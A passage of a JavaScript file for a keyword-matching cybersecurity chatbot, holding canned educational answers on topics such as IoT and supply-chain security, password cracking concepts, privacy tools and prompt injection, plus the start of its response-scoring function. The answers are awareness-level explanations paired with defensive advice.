    response: "Wardriving involves driving around with a WiFi-enabled device and software (Kismet, WiFi Pineapple) to detect and map wireless networks, documenting SSIDs, security types, signal strengths, and GPS locations. Often used in reconnaissance for targeting insecure networks. Defense: ensure your WiFi uses WPA2/WPA3, disable SSID broadcast if possible (reduces visibility, not a strong defense), and monitor for unauthorized access points on your network."
  },
  {
    keywords: ["bluetooth security", "bluetooth attack", "bluejacking", "bluesnarfing", "blueborne"],
    response: "Bluetooth attacks: Bluejacking (sending unsolicited messages), Bluesnarfing (unauthorized data access), Bluebugging (taking control of a device), and BlueBorne (critical vulnerabilities enabling RCE without pairing). Best practices: disable Bluetooth when not in use, keep devices non-discoverable, apply firmware/OS updates promptly, and pair devices only in private locations. BlueBorne (2017) could spread like a worm between nearby Bluetooth-enabled devices."
  },

  // ── IoT SECURITY ─────────────────────────────────────────────
  {
    keywords: ["iot security", "internet of things", "smart home security", "connected devices"],
    response: "IoT devices (smart TVs, cameras, thermostats, appliances) often have: weak/default credentials, unencrypted communications, infrequent security updates, and large attack surfaces. They represent millions of entry points into home and enterprise networks. Best practices: change default credentials immediately, update firmware regularly, place IoT devices on a separate VLAN/guest network (segment from computers/phones), disable UPnP on routers, and buy from manufacturers with a clear security update commitment."
  },
  {
    keywords: ["smart home security", "alexa security", "google home privacy", "smart speaker"],
    response: "Smart speakers and home automation raise both security and privacy concerns. Risks: always-on microphones activated by false triggers, unencrypted local communications, weak authentication on companion apps, and physical tampering. Mitigations: review voice history and delete regularly, use strong account passwords + MFA, create a separate IoT WiFi network, keep firmware updated, and understand what data the manufacturer collects. Consider whether the convenience-to-privacy tradeoff is acceptable for specific devices."
  },
  {
    keywords: ["ics security", "scada security", "industrial control systems", "operational technology", "ot security"],
    response: "ICS/SCADA (Industrial Control Systems / Supervisory Control and Data Acquisition) security protects critical infrastructure: power grids, water treatment, oil pipelines, manufacturing. Challenges: legacy systems designed for availability (not security), often can't be patched or rebooted, air-gapped (but increasingly connected to IT networks), and attacks can have physical consequences. Stuxnet (2010) was the first known malware targeting ICS, damaging Iranian nuclear centrifuges. Frameworks: IEC 62443, NIST SP 800-82."
  },

  // ── SUPPLY CHAIN SECURITY ─────────────────────────────────────
  {
    keywords: ["supply chain attack", "solarwinds", "software supply chain", "third party risk"],
    response: "Supply chain attacks compromise software or hardware before it reaches the end user — targeting the development/distribution chain rather than the victim directly. SolarWinds (2020): Russian SVR (APT29) injected malware into SolarWinds Orion software updates, compromising 18,000+ organizations including US government agencies. XZ Utils backdoor (2024): sophisticated social engineering to plant a backdoor in a widely-used Linux compression library. Defense: SBOM (Software Bill of Materials), code signing, dependency auditing, and vendor security assessments."
  },
  {
    keywords: ["sbom", "software bill of materials", "dependency security", "open source risk"],
    response: "A Software Bill of Materials (SBOM) is a formal inventory of all software components, libraries, and their versions in an application — like a nutritional label for software. It enables: rapid identification of vulnerable components (e.g., knowing which products use Log4j when Log4Shell drops), license compliance tracking, and supply chain transparency. SBOM generation tools: Syft, CycloneDX, SPDX. Mandated for US government software procurement post-SolarWinds (Executive Order 14028)."
  },
  {
    keywords: ["open source security", "dependency confusion", "typosquatting npm", "malicious package"],
    response: "Open-source dependencies introduce supply chain risk. Attack vectors: dependency confusion (publishing malicious packages with the same name as internal packages, tricking package managers into downloading the public version), typosquatting (npm packages with names like 'lodash' vs 'loadash'), and compromised maintainer accounts. Defense: lock dependency versions (package-lock.json), use private package registries, scan dependencies (Snyk, Dependabot, OWASP Dependency-Check), and prefer packages with active maintenance and security policies."
  },

  // ── DATA SECURITY & PRIVACY ──────────────────────────────────
  {
    keywords: ["data classification", "data sensitivity", "classify data", "public confidential secret"],
    response: "Data classification categorizes data by sensitivity level to determine appropriate protection: Public (freely shareable), Internal (for employees only), Confidential (business-sensitive, limited access), Restricted/Secret (most sensitive — PII, financial records, trade secrets, PHI). Once classified, apply corresponding controls: access restrictions, encryption requirements, data handling procedures, and data retention/deletion schedules. Unclassified data often receives insufficient protection."
  },
  {
    keywords: ["data loss prevention", "dlp", "data exfiltration prevention", "data leakage"],
    response: "DLP (Data Loss Prevention) tools monitor, detect, and block unauthorized transfer of sensitive data — whether intentional exfiltration or accidental leakage. DLP operates at endpoints (agent monitoring file actions), networks (inspecting traffic for sensitive patterns), and cloud (CASB integration). It uses pattern matching (credit card numbers, SSNs, PHI keywords), document fingerprinting, and ML-based content analysis. Challenge: tuning to minimize false positives while catching actual exfiltration."
  },
  {
    keywords: ["pii", "personally identifiable information", "personal data", "sensitive data"],
    response: "PII (Personally Identifiable Information) is data that can identify a specific individual: name, SSN, passport number, biometrics, email, phone, location. Sensitive PII (financial, medical, ethnic, sexual orientation data) warrants even stricter protection. Obligations: collect only what's needed (data minimization), secure it appropriately, disclose use clearly, and safely dispose when no longer needed. Exposure of PII triggers breach notification requirements under GDPR, US state laws (CCPA), HIPAA, etc."
  },
  {
    keywords: ["data breach notification", "breach notice", "notify customers", "breach disclosure"],
    response: "Most jurisdictions require notifying affected individuals and regulators after a personal data breach. Timelines vary: GDPR (72 hours to supervisory authority), HIPAA (60 days for large breaches), US state laws (typically 30-90 days). Notification must include: what happened, what data was affected, what you're doing, and how individuals can protect themselves. Preparation: draft notification templates in advance, identify your notification obligations by geography, and establish a breach response team."
  },
  {
    keywords: ["anonymization", "pseudonymization", "data masking", "tokenization", "de-identify"],
    response: "Techniques to reduce privacy risk of data:\n• Anonymization — irreversible removal of identifying information (truly anonymous data isn't regulated under GDPR)\n• Pseudonymization — replacing identifiers with tokens (re-identification possible with the key — still regulated)\n• Data masking — replacing real data with realistic fake data for testing/development\n• Tokenization — replacing sensitive values (card numbers) with non-sensitive tokens; original retrievable via token vault\nTrue anonymization is difficult — research shows 87% of Americans can be identified with just zip code, birthdate, and sex."
  },

  // ── SECURITY AWARENESS & HUMAN FACTORS ──────────────────────
  {
    keywords: ["security awareness training", "security culture", "phishing simulation", "employee training"],
    response: "Security awareness training teaches employees to recognize and respond to threats. Effective programs go beyond annual checkbox compliance: they use: simulated phishing campaigns (test and teach simultaneously), microlearning (short, frequent modules), role-based training, gamification, and positive reinforcement rather than blame. Metrics: phishing simulation click rates, reporting rates, training completion, and incident reduction. A security culture where employees feel safe reporting mistakes is more valuable than technical controls alone."
  },
  {
    keywords: ["insider threat", "malicious insider", "disgruntled employee", "data theft employee"],
    response: "Insider threats come from current/former employees, contractors, or partners who misuse authorized access. Types: malicious insiders (intentionally stealing data or causing damage), negligent insiders (accidental data exposure through careless actions), and compromised insiders (credentials stolen by external attackers). Detection: behavioral analytics (UEBA), DLP monitoring unusual data access, privileged access management, and exit procedures that immediately revoke access. Balance monitoring with employee privacy and trust."
  },
  {
    keywords: ["ueba", "user entity behavior analytics", "behavioral analytics", "anomaly detection users"],
    response: "UEBA (User and Entity Behavior Analytics) uses machine learning to establish baselines of normal user and system behavior, then alerts on deviations. Examples of detected anomalies: a user accessing 10x their normal data volume, logging in from an unusual location, accessing systems outside their job role, or exfiltrating data at 3am. It's particularly valuable for detecting compromised accounts, insider threats, and advanced persistent threats that evade signature-based detection."
  },

  // ── CRYPTOGRAPHIC ATTACKS ────────────────────────────────────
  {
    keywords: ["brute force", "brute force attack", "cracking password", "hashcat", "john the ripper"],
    response: "Brute force attacks try every possible combination until finding the correct one. Offline cracking (against captured hash databases) is much faster than online attacks. Tools: Hashcat (GPU-accelerated, can try billions of guesses/second) and John the Ripper. Attack modes: dictionary attacks (wordlists like RockYou), rule-based (appending numbers/symbols), and mask attacks (targeted patterns). Defense: strong, long, unique passwords (significantly increases cracking time), bcrypt/Argon2 for password hashing (computationally expensive), MFA."
  },
  {
    keywords: ["rainbow table", "precomputed hash", "hash lookup", "salting defense"],
    response: "Rainbow tables are precomputed tables of password-to-hash mappings that allow instant lookup of hash → password without computing anything in real time — trading storage space for speed. Defense: salting (adding a unique random value to each password before hashing) makes rainbow tables useless, because the attacker would need a separate rainbow table for each unique salt — computationally impossible. This is why proper password storage always salts each hash individually."
  },
  {
    keywords: ["birthday attack", "collision attack", "hash collision", "md5 collision"],
    response: "The birthday attack exploits the birthday paradox — finding any two inputs that produce the same hash value (collision) is much easier than finding a specific input for a given hash. For an n-bit hash, collisions can be found in roughly 2^(n/2) operations rather than 2^n. MD5 and SHA-1 are both broken for collision resistance — attackers can craft two files with identical hashes. This breaks digital signature schemes and file integrity verification. Use SHA-256 or SHA-3 minimum."
  },

  // ── ADVANCED PERSISTENT THREATS ─────────────────────────────
  {
    keywords: ["apt", "advanced persistent threat", "nation state", "state sponsored", "advanced attacker"],
    response: "APT (Advanced Persistent Threat) describes sophisticated, well-resourced threat actors — typically nation-state sponsored — who conduct prolonged, targeted campaigns to achieve strategic objectives (espionage, sabotage, intellectual property theft). Characteristics: stealthy (remain undetected for months or years), targeted (specific organizations), persistent (regain access after detection), well-funded. Notable APTs: APT28/Fancy Bear (Russian GRU), APT41 (Chinese MSS), Lazarus Group (North Korea). They use zero-days, custom malware, and sophisticated tradecraft."
  },
  {
    keywords: ["stuxnet", "industrial malware", "olympic games", "iran nuclear", "cyber weapon"],
    response: "Stuxnet (discovered 2010, deployed circa 2007-2010) is considered the world's first digital weapon — a joint US/Israeli operation (codenamed 'Olympic Games') targeting Iranian uranium enrichment centrifuges at Natanz. It used 4 zero-day exploits, spread via USB drives (to reach air-gapped networks), and subtly altered centrifuge speed while reporting normal readings — causing physical damage while masking the source. It demonstrated that cyberattacks could cause real-world physical destruction."
  },
  {
    keywords: ["solarwinds attack", "sunburst", "apt29", "cozy bear", "software supply chain nation state"],
    response: "The SolarWinds attack (discovered December 2020) was a sophisticated Russian SVR (APT29/Cozy Bear) operation: malicious code (SUNBURST) was inserted into SolarWinds Orion software updates distributed to ~18,000 customers. Approximately 100 organizations were actively compromised, including US Treasury, State Department, and cybersecurity firm FireEye. SUNBURST lay dormant for weeks before activating, blending into legitimate traffic patterns. It exposed the devastating potential of software supply chain attacks."
  },

  // ── PHYSICAL SECURITY ────────────────────────────────────────
  {
    keywords: ["physical security", "access control physical", "keycard", "mantrap", "cctv"],
    response: "Physical security protects hardware and facilities from unauthorized access. Layered approach: perimeter (fences, vehicle barriers) → building access (keycards, biometrics, security guards, mantraps/airlocks) → internal zones (server room access restrictions) → equipment (locked cabinets, cable locks). Employees with physical access to servers can often bypass all software security. Ensure clean desk policies, visitor escort procedures, and security camera coverage of critical areas."
  },
  {
    keywords: ["dumpster diving", "trash security", "physical information gathering", "document disposal"],
    response: "Dumpster diving is searching through discarded materials for sensitive information — employee directories, old hardware with data, financial documents, configuration printouts, and access badges. It's surprisingly productive and legal in many jurisdictions if materials are in public trash. Defense: cross-cut shredding of all documents (strip-cut shredders are insufficient — strips can be reassembled), secure disposal of old hard drives (physical destruction or certified degaussing), and clean desk policies."
  },

  // ── SECURE DEVELOPMENT (DEVSECOPS) ──────────────────────────
  {
    keywords: ["devsecops", "secure sdlc", "security in development", "application security"],
    response: "DevSecOps integrates security throughout the software development lifecycle rather than as a final gate. Practices by phase:\n• Planning — threat modeling, security requirements\n• Development — secure coding guidelines, IDE security plugins, pre-commit hooks\n• Build — SAST (static analysis), dependency scanning\n• Test — DAST (dynamic analysis), IAST, pen testing\n• Deploy — infrastructure scanning, secrets detection\n• Operate — RASP, runtime monitoring, vulnerability management\nTools: Snyk, Checkmarx, Semgrep, OWASP ZAP, Trivy."
  },
  {
    keywords: ["sast", "static analysis", "code scanning", "sonarqube", "semgrep", "static application security"],
    response: "SAST (Static Application Security Testing) analyzes source code, bytecode, or binaries without executing the application — finding vulnerabilities like SQL injection patterns, hardcoded secrets, buffer overflows, and insecure API usage. Runs during development and CI/CD pipelines for early feedback. Tools: Semgrep (fast, customizable rules), SonarQube (multi-language, technical debt), Checkmarx, Veracode, Coverity. Limitation: higher false positive rates — requires tuning and developer triage."
  },
  {
    keywords: ["dast", "dynamic testing", "owasp zap", "web scanner", "runtime scanning"],
    response: "DAST (Dynamic Application Security Testing) tests running applications by sending malicious inputs and analyzing responses — simulating real attacks without access to source code. Detects: XSS, SQLi, CSRF, authentication flaws, and misconfigurations. OWASP ZAP (free, open-source) and Burp Suite Professional are the dominant tools. Best run in staging environments. IAST (Interactive AST) instruments the application during testing for the accuracy of DAST with code-level detail."
  },
  {
    keywords: ["secrets management", "hardcoded secrets", "api key exposure", "vault", "gitguardian"],
    response: "Hardcoded secrets in code (API keys, passwords, tokens) are a critical risk — especially when code is pushed to public repositories (GitHub). They're immediately scraped by bots. Prevention: use secrets managers (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) to inject secrets at runtime, use pre-commit hooks to detect secrets before they're committed (git-secrets, detect-secrets), and rotate any secrets exposed. GitGuardian monitors for leaked secrets in real time."
  },
  {
    keywords: ["threat modeling", "stride", "dread", "attack trees", "secure design"],
    response: "Threat modeling is a structured process for identifying, prioritizing, and mitigating security threats during the design phase. STRIDE model categorizes threats: Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Process: diagram the system (data flow diagrams) → identify trust boundaries → enumerate threats per component → assess risk → define mitigations. Tools: Microsoft Threat Modeling Tool, OWASP Threat Dragon, IriusRisk."
  },

  // ── SECURE PROTOCOLS & STANDARDS ────────────────────────────
  {
    keywords: ["ssh", "secure shell", "sftp", "scp", "remote access protocol"],
    response: "SSH (Secure Shell) provides encrypted remote access, replacing insecure Telnet/rlogin. Key features: strong encryption (typically AES-256-GCM), public key authentication (no password transmission), port forwarding, and SFTP/SCP for secure file transfer. Best practices: disable password authentication (use key pairs only), disable root login, change default port 22 (minor obfuscation), use fail2ban to block brute force, restrict access by IP, and use ed25519 keys (modern, efficient)."
  },
  {
    keywords: ["https", "http vs https", "ssl certificate", "mixed content", "hsts header"],
    response: "HTTPS = HTTP + TLS encryption. It provides: confidentiality (traffic encrypted), integrity (tampering detected), and authentication (verifies you're talking to the real server, not an impersonator). HTTP is plaintext — anyone on the network path can read it. Modern browsers warn on HTTP sites. HSTS (HTTP Strict Transport Security) header tells browsers to always use HTTPS for your domain, preventing SSL stripping attacks. Let's Encrypt provides free certificates — there's no excuse for HTTP in 2024."
  },
  {
    keywords: ["dns over https", "doh", "dns over tls", "dot", "encrypted dns"],
    response: "Traditional DNS queries are sent in plaintext — revealing every domain you visit to your ISP, network operator, or anyone monitoring the network. DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt DNS queries, protecting browsing privacy. DoH uses standard HTTPS port 443 (harder to block), DoT uses port 853. Major providers: Cloudflare (1.1.1.1), Google (8.8.8.8), Quad9 (9.9.9.9 — blocks malicious domains). Enable in browser settings or operating system."
  },
  {
    keywords: ["snmp security", "telnet", "ftp insecure", "unencrypted protocols", "legacy protocols"],
    response: "Legacy protocols transmit data in plaintext and should be replaced: Telnet → SSH, FTP → SFTP/FTPS/SCP, HTTP → HTTPS, SNMPv1/v2 → SNMPv3 (adds authentication and encryption), rlogin/rsh → SSH. Insecure protocols create easy targets for credential sniffing. Audit your network for devices still using these protocols — printers, network equipment, and legacy servers are common offenders. Most firewalls can block these protocols at the perimeter."
  },

  // ── CAREER & CERTIFICATIONS ──────────────────────────────────
  {
    keywords: ["cybersecurity career", "how to get into cybersecurity", "security career path", "jobs in cybersecurity"],
    response: "Cybersecurity career paths include: SOC analyst, penetration tester, security engineer, cloud security architect, incident responder, GRC analyst, threat intelligence analyst, malware analyst, and CISO. Entry point options: CompTIA Security+ certification (excellent foundation), IT experience (help desk, networking, sysadmin), a CS/cybersecurity degree, or bootcamps/self-study via platforms like TryHackMe and Hack The Box. The field has a massive talent shortage — motivated learners can break in within 1-2 years."
  },
  {
    keywords: ["comptia security+", "security plus", "entry level cert", "security certification beginner"],
    response: "CompTIA Security+ (SY0-701) is the industry's most widely recognized entry-level cybersecurity certification. It covers: threats & attacks, cryptography, PKI, identity management, network security, risk management, incident response, and compliance. Vendor-neutral, DoD 8570 approved (required for many US government contractor roles). Recommended path to Security+: A+ and Network+ first (or equivalent experience), then Security+. Study resources: Professor Messer (free), Darril Gibson's guide, Jason Dion's Udemy course."
  },
  {
    keywords: ["cissp", "certified information systems security professional", "isc2", "advanced cert"],
    response: "CISSP (Certified Information Systems Security Professional) from ISC2 is the gold standard for senior security professionals. Covers 8 domains: Security & Risk Management, Asset Security, Security Architecture, Communication & Network Security, Identity & Access Management, Security Assessment & Testing, Security Operations, and Software Development Security. Prerequisites: 5 years paid experience in 2+ domains. Demonstrates broad strategic security knowledge — often required for senior/director/CISO roles."
  },
  {
    keywords: ["ceh", "certified ethical hacker", "offensive security", "oscp", "penetration testing cert"],
    response: "Key offensive security certifications:\n• CEH (Certified Ethical Hacker) — EC-Council's entry-level ethical hacking cert; knowledge-based, criticized for not requiring hands-on demonstration\n• OSCP (Offensive Security Certified Professional) — highly respected hands-on pen testing cert from Offensive Security; 24-hour practical exam requiring compromising multiple machines\n• PNPT (Practical Network Penetration Tester) — TCM Security's affordable hands-on alternative, industry-respected\nFor practical pen testing skills, OSCP/PNPT are significantly more valued than CEH by hiring managers."
  },
  {
    keywords: ["tryhackme", "hackthebox", "ctf", "capture the flag", "practice hacking legally"],
    response: "Hands-on learning platforms for cybersecurity:\n• TryHackMe — structured guided rooms, excellent for beginners, browser-based (no local setup needed)\n• Hack The Box — more advanced, realistic machines, respected by professionals, active community\n• CTF (Capture The Flag) — competitions with security puzzles covering web, crypto, forensics, reversing, pwn\n• PentesterLab — web application security focused\n• VulnHub — downloadable vulnerable VMs for offline practice\n• OWASP WebGoat/DVWA — deliberately vulnerable web apps for web security practice\nBuilding a home lab with VMs is invaluable for hands-on experience."
  },
  {
    keywords: ["bug bounty start", "learn bug bounty", "first bug bounty", "recon methodology"],
    response: "Getting started in bug bounty: 1) Learn web security fundamentals (PortSwigger Web Security Academy is free and excellent). 2) Practice on intentionally vulnerable apps (DVWA, HackTheBox). 3) Understand the OWASP Top 10 practically. 4) Start on programs with broad scope (HackerOne's public programs). 5) Focus on a specific area (XSS, IDOR, logic flaws) before going broad. Beginner-friendly bounties: IDOR, open redirects, missing security headers. Read disclosed reports on HackerOne's Hacktivity for real examples."
  },

  // ── DARK WEB & CYBERCRIME ────────────────────────────────────
  {
    keywords: ["dark web", "darknet", "tor hidden service", "onion site"],
    response: "The dark web is a subset of the deep web accessible only via special software like Tor, using .onion addresses. It provides strong anonymity — used by journalists, dissidents, and privacy advocates in authoritarian countries, as well as by criminals for markets selling stolen data, drugs, counterfeit goods, malware, and exploit kits. Cybersecurity professionals monitor dark web forums and marketplaces for threat intelligence — detecting if their organization's data is being sold."
  },
  {
    keywords: ["stolen credentials", "dark web market", "breach data", "have i been pwned", "leaked data"],
    response: "Data breaches result in stolen credentials (username/password pairs), payment cards, and personal data sold or freely distributed on dark web forums and marketplaces. HaveIBeenPwned (haveibeenpwned.com, created by Troy Hunt) aggregates breach data and lets individuals check if their email/password appears in known breaches. Organizations can monitor for their domain's credentials in breaches. Change passwords immediately if you appear in a breach — and use unique passwords so one breach doesn't cascade."
  },
  {
    keywords: ["cybercrime", "cybercriminal", "hacker motivation", "financial crime online", "fraud"],
    response: "Cybercriminals are motivated by: financial gain (most common — ransomware, fraud, data theft for sale), espionage (nation-states, corporate), hacktivism (ideological — Anonymous), and notoriety/thrill (less common today). The cybercrime ecosystem is highly professionalized: initial access brokers sell network access, RaaS groups provide ransomware-as-a-service, money mules launder proceeds, and technical specialists sell exploit kits. It operates like a dark mirror of legitimate SaaS business models."
  },

  // ── PRIVACY TOOLS & PERSONAL SECURITY ───────────────────────
  {
    keywords: ["signal", "encrypted messaging", "private chat app", "whatsapp vs signal", "telegram security"],
    response: "For private messaging: Signal is the gold standard — open-source, E2EE by default for all messages and calls, minimal metadata collection, and used by security professionals worldwide. WhatsApp uses the Signal Protocol for E2EE but is owned by Meta (metadata and backup concerns). Telegram: messages are NOT E2EE by default (only 'Secret Chats' are) — regular chats are stored on Telegram's servers. iMessage: E2EE between Apple devices but iCloud backups may be accessible to Apple."
  },
  {
    keywords: ["browser privacy", "firefox privacy", "brave browser", "chrome privacy", "tracker blocking"],
    response: "Browser privacy options: Brave (Chromium-based, built-in tracker/ad blocking, fingerprinting protection, best out-of-the-box privacy), Firefox with uBlock Origin + Privacy Badger (highly configurable), Tor Browser (maximum anonymity, but slow). Extensions to add: uBlock Origin (ad/tracker blocking), HTTPS Everywhere (now built into most browsers), Privacy Badger. Avoid Chrome if privacy matters — Google collects extensive data. Clear browsing data regularly and consider containerization (Firefox Multi-Account Containers)."
  },
  {
    keywords: ["vpn provider", "trustworthy vpn", "no log vpn", "mullvad", "protonvpn", "nordvpn"],
    response: "Evaluating VPN providers: Look for independently audited no-log policies (not just claimed), jurisdiction (outside 14 Eyes surveillance alliance), open-source clients, strong protocols (WireGuard or OpenVPN), and kill switch support. Reputable options: Mullvad (accepts cash/cryptocurrency, strong privacy, no email required to sign up), ProtonVPN (Switzerland-based, open-source, free tier). Be skeptical of VPNs with flashy marketing — they may log and sell your data. Free VPNs are often the product, not the service."
  },
  {
    keywords: ["privacy email", "encrypted email", "protonmail", "tutanota", "email privacy"],
    response: "For private email: ProtonMail (Switzerland, E2EE between ProtonMail users, open-source, zero-knowledge for stored mail) and Tutanota (Germany, similar approach) are leading privacy-focused providers. For temporary disposable addresses: SimpleLogin, AnonAddy (email aliasing — create unique addresses that forward to your real inbox, preventing tracking and reducing spam). PGP/GPG can add E2EE to any email provider but requires both parties to have it configured."
  },
  {
    keywords: ["data broker", "people search", "remove personal info", "opt out", "delete data online"],
    response: "Data brokers aggregate and sell your personal information — address, relatives, phone number, income estimates, social profiles. The data is used for targeted advertising, background checks, and by stalkers/scammers. Opt-out manually from major brokers (Spokeo, Whitepages, Intelius, BeenVerified) using their individual opt-out processes. Services like DeleteMe, Privacy Bee, or Kanary automate removal requests for a fee. Regularly search your name to see what's publicly visible."
  },

  // ── EMERGING THREATS ─────────────────────────────────────────
  {
    keywords: ["ai security", "ai hacking", "machine learning attack", "adversarial ml", "ai threat"],
    response: "AI/ML systems introduce new attack surfaces:\n• Adversarial examples — inputs crafted to fool ML models (slightly altered images misclassified with high confidence)\n• Model poisoning — corrupting training data to introduce backdoors\n• Model extraction — querying a model repeatedly to reconstruct it\n• Prompt injection — manipulating LLM behavior through crafted inputs (critical for AI-integrated applications)\nDefenses: adversarial training, input validation, model monitoring, and access controls on model APIs. AI is also transforming attacks — enabling more convincing spear phishing, voice cloning for vishing, and accelerated vulnerability discovery."
  },
  {
    keywords: ["deepfake", "synthetic media", "ai voice clone", "video manipulation"],
    response: "Deepfakes use AI (specifically GANs and diffusion models) to create hyper-realistic synthetic video, audio, and images. Security implications: video/audio of executives authorizing fraudulent wire transfers (already happening), creating false evidence, undermining trust in authentic media, and identity fraud. Detection: technical artifacts in manipulated media, but detection is increasingly difficult as generation improves. Defense: out-of-band verification protocols for any unusual financial request — call the person back on a known number."
  },
  {
    keywords: ["prompt injection", "llm security", "ai jailbreak", "chatgpt attack", "indirect prompt injection"],
    response: "Prompt injection attacks manipulate Large Language Models by injecting instructions that override the system prompt or intended behavior. Direct: user crafts inputs to make the LLM ignore safety guidelines. Indirect: malicious instructions embedded in content the LLM processes (a webpage, document, or email) — it reads the 'hidden' instructions and executes them. Critical risk as LLMs gain agent capabilities (browsing web, executing code, sending emails). Defense: privilege separation, input sanitization, output validation, and minimal privilege for AI agents."
  },
  {
    keywords: ["5g security", "cellular security", "imsi catcher", "stingray", "network security"],
    response: "5G security improvements over 4G: better encryption of subscriber identifiers (SUPI/SUCI instead of plaintext IMSI), improved mutual authentication, and network slicing isolation. However: IMSI catchers (Stingrays) that impersonate cell towers remain a threat in certain conditions, 5G network slicing creates new attack surfaces, and the expanded IoT connectivity of 5G increases the attack surface dramatically. Security largely depends on correct carrier implementation of the standard."
  },

  // ── MISCELLANEOUS IMPORTANT TOPICS ──────────────────────────
  {
    keywords: ["public wifi safety", "coffee shop wifi", "hotel wifi security", "open wifi"],
    response: "Public WiFi risks: traffic sniffing (unencrypted connections are readable), evil twin APs, and MitM attacks. Safe practices: use a trusted VPN (encrypts all traffic before it leaves your device), stick to HTTPS sites (check for padlock), avoid accessing banking/sensitive accounts, turn off WiFi auto-connect, disable file sharing, and prefer your phone's cellular hotspot over untrusted public WiFi. Never enter passwords on sites without HTTPS on public networks."
  },
  {
    keywords: ["cybersecurity news", "security news", "latest threats", "recent breach", "current vulnerabilities"],
    response: "Stay current on cybersecurity through: Krebs on Security (krebsonsecurity.com — excellent investigative journalism), The Hacker News (thehackernews.com — daily news), Bleeping Computer (bleepingcomputer.com — breaches, malware), SANS Internet Stormcast (daily 5-minute podcast), Risky Business (weekly podcast for professionals), and CISA advisories (cisa.gov/news-events/alerts). Subscribe to CVE alerts for technologies you use and follow CISA's Known Exploited Vulnerabilities catalog."
  },
  {
    keywords: ["cyber insurance", "cybersecurity insurance", "ransomware insurance", "breach insurance"],
    response: "Cyber insurance covers financial losses from cyberattacks — ransomware payments (where legally permissible), forensic investigation, breach notification costs, legal liability, business interruption, and regulatory fines. Premiums have skyrocketed due to ransomware payouts. Insurers increasingly mandate security controls (MFA, EDR, backup testing, security training) as prerequisites. Important caveats: read exclusions carefully (war exclusions, failure to maintain reasonable security), and insurance doesn't replace having good security — it supplements it."
  },
  {
    keywords: ["security audit", "security assessment", "gap analysis", "security review", "pen test vs audit"],
    response: "Security assessments range in depth and scope:\n• Security audit — evaluates compliance with policies and standards (checklist-based)\n• Vulnerability assessment — automated scanning for known vulnerabilities\n• Penetration test — authorized simulated attack attempting to exploit vulnerabilities\n• Red team exercise — full-scope adversary simulation including social engineering and physical\n• Security architecture review — assesses design against best practices\nChoose based on your needs: compliance (audit), vulnerability inventory (VA), exploitability (pen test), or realistic attack simulation (red team)."
  },
  {
    keywords: ["disaster recovery", "business continuity", "rto", "rpo", "backup restore", "dr plan"],
    response: "Disaster Recovery (DR) and Business Continuity Planning (BCP) ensure organizations survive and recover from disruptive events. Key metrics: RTO (Recovery Time Objective — max acceptable downtime) and RPO (Recovery Point Objective — max acceptable data loss, measured in time). DR strategies: cold site (infrastructure ready to deploy), warm site (partially operational), hot site (fully operational redundant environment), and cloud-based DR. Test your DR plan regularly — untested plans often fail when needed most. Ransomware incidents are now a primary driver for DR planning."
  },
  {
    keywords: ["cyber hygiene", "basic security", "everyday security tips", "personal security tips"],
    response: "Essential cyber hygiene for everyone:\n✓ Unique passwords for every account (use a password manager)\n✓ MFA on all important accounts — email first, then banking and social media\n✓ Keep OS, browser, and apps updated with automatic updates enabled\n✓ Be skeptical of unexpected links, attachments, and urgent requests\n✓ Back up important data regularly (3-2-1 rule)\n✓ Use reputable antivirus/endpoint protection\n✓ Lock your device screen and use full-disk encryption\n✓ Review app permissions on mobile devices\n✓ Check haveibeenpwned.com for your email addresses"
  },
  {
    keywords: ["what to do if hacked", "i got hacked", "account compromised", "breach response personal"],
    response: "If you think you've been hacked:\n1. Change compromised passwords immediately (from a clean device if possible)\n2. Enable MFA on the account and linked accounts\n3. Check for unauthorized changes (forwarding rules in email, added recovery contacts)\n4. Check other accounts using the same password — change all of them\n5. Review account activity and revoke unrecognized sessions\n6. Scan your device for malware\n7. Notify contacts if the attacker may have impersonated you\n8. For financial accounts: contact the institution and consider credit freeze\n9. Document everything for potential reports to authorities"
  },
  {
    keywords: ["responsible disclosure", "vulnerability report", "security researcher", "report a bug"],
    response: "If you discover a vulnerability: look for a security.txt file or security/disclosure policy on the organization's website (standardized per RFC 9116), or contact security@[domain.com]. Provide: clear description, reproduction steps, potential impact, and your contact info. Give the organization a reasonable timeline (90 days is industry standard, pioneered by Google Project Zero) before considering public disclosure. Avoid accessing data beyond what's needed to verify the vulnerability. Check if the organization has a bug bounty program for potential compensation."
  },

  // ── QUICK REFERENCE FALLBACK ─────────────────────────────────
  {
    keywords: ["example", "show me example", "give example", "real world"],
    response: "Sure! Here are some real-world cybersecurity examples: The 2017 WannaCry ransomware exploited an unpatched Windows SMB vulnerability (MS17-010), encrypting files at 200,000+ organizations including UK NHS hospitals. The 2013 Target breach originated from a phishing email sent to an HVAC vendor with network access — demonstrating third-party risk. The 2021 Colonial Pipeline attack (ransomware) disrupted fuel supply to the US East Coast. These show how technical vulnerabilities, human error, and poor segmentation combine to create major incidents."
  },
  {
    keywords: ["statistics", "cybersecurity stats", "numbers", "cost of breach", "breach statistics"],
    response: "Key cybersecurity statistics (approximate): Average cost of a data breach: $4.45M globally (IBM Cost of Data Breach 2023). Average ransomware payment: $1.54M (2023). Mean time to identify a breach: 204 days; to contain: 73 days. 74% of breaches involve the human element (phishing, social engineering, misuse). 83% of organizations experienced more than one breach. Cybercrime costs are projected to reach $10.5 trillion annually by 2025. The security talent gap: 3.5 million unfilled cybersecurity positions globally."
  }

];

// ============================================================
// Intelligent Response Engine — Multi-Signal Scoring
// ============================================================

export const getAIResponse = (userMessage) => {
  if (!userMessage || typeof userMessage !== "string") {
    return "Please ask a cybersecurity question — I'm here to help!";
  }

  const msg = userMessage.toLowerCase().trim();

  if (msg.length < 2) {
    return "Please ask a cybersecurity question — I'm here to help!";
  }

  // ── Tokenize for smarter matching ──
  const words = msg.split(/\s+/);

  let bestMatch = null;
  let highestScore = 0;

  for (const item of cybersecurityDataset) {
    let score = 0;

    for (const keyword of item.keywords) {
      const kw = keyword.toLowerCase();

      if (msg.includes(kw)) {
        // Exact phrase match scores higher than single word
        const isPhrase = kw.includes(" ");
        score += isPhrase ? 3 : 1;

        // Bonus: keyword appears near the beginning of message (likely the topic)
        if (msg.indexOf(kw) < 30) {
          score += 0.5;
        }

        // Bonus: keyword matches a whole word (not substring)
        const wordBoundaryRegex = new RegExp(`\\b${kw.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\b`);
        if (wordBoundaryRegex.test(msg)) {
          score += 0.5;
        }
      }
